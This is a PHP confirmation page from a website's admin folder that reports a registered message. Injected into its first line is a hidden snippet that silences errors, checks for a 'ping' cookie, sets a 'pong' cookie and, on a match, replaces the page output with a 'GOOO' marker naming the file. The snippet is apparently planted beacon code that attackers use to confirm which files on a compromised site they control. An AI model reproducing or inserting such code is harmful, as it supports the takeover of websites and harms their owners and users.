<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/msgs_ok.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/msgs_ok.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/msgs_ok.php<-";}return "NotGO->./cynergi/admin/msgs_ok.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
...
<table width="816" height="367" border="0" align="center">
  <tr>
    ...
    <table width="533" border="0">
      <tr>
        <td width="477" align="center" class="caja_search">Your message was correctly registered!</td>
      </tr>
    </table>
    <p>&nbsp;</p></td>
  </tr>
